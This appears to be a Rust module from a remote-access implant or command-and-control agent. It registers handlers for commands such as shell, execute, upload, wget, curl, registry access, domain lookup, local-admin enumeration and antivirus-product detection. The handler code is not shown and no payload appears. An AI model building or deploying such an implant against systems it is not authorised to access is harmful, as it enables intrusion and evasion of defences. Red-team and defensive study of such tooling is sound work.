use std::collections::HashMap;
use crate::internal::listener::{TaskHandler};

mod unsupported;
mod whoami;
mod env;
mod pwd;
mod cd;
mod rm;
mod reg;
mod run;
mod shell;
mod upload;
mod wget;
mod cat;
mod cp;
mod curl;
mod get_domain;
mod get_local_admins;
mod ls;
mod mkdir;
mod ps;
mod mv;
mod execute;
mod get_av_products;

pub fn handlers() -> HashMap<String, Box<dyn TaskHandler>> {
    let mut handlers: HashMap<String, Box<dyn TaskHandler>> = HashMap::new();

    handlers.insert(cp::COMMAND.to_string(), Box::new(cp::Command {}));
    handlers.insert(cd::COMMAND.to_string(), Box::new(cd::Command {}));
    handlers.insert(ls::COMMAND.to_string(), Box::new(ls::Command {}));
    handlers.insert(rm::COMMAND.to_string(), Box::new(rm::Command {}));
    handlers.insert(ps::COMMAND.to_string(), Box::new(ps::Command {}));
    handlers.insert(mv::COMMAND.to_string(), Box::new(mv::Command {}));
    handlers.insert(cat::COMMAND.to_string(), Box::new(cat::Command {}));
    handlers.insert(env::COMMAND.to_string(), Box::new(env::Command {}));
    handlers.insert(pwd::COMMAND.to_string(), Box::new(pwd::Command {}));
    handlers.insert(reg::COMMAND.to_string(), Box::new(reg::Command {}));
    handlers.insert(run::COMMAND.to_string(), Box::new(run::Command {}));
    handlers.insert(wget::COMMAND.to_string(), Box::new(wget::Command {}));
    handlers.insert(curl::COMMAND.to_string(), Box::new(curl::Command {}));
    handlers.insert(mkdir::COMMAND.to_string(), Box::new(mkdir::Command {}));
    handlers.insert(shell::COMMAND.to_string(), Box::new(shell::Command {}));
    handlers.insert(upload::COMMAND.to_string(), Box::new(upload::Command {}));
    handlers.insert(whoami::COMMAND.to_string(), Box::new(whoami::Command {}));
    handlers.insert(execute::COMMAND.to_string(), Box::new(execute::Command {}));
    handlers.insert(get_domain::COMMAND.to_string(), Box::new(get_domain::Command {}));
    handlers.insert(get_av_products::COMMAND.to_string(), Box::new(get_av_products::Command {}));
    handlers.insert(get_local_admins::COMMAND.to_string(), Box::new(get_local_admins::Command {}));

    return handlers;
}

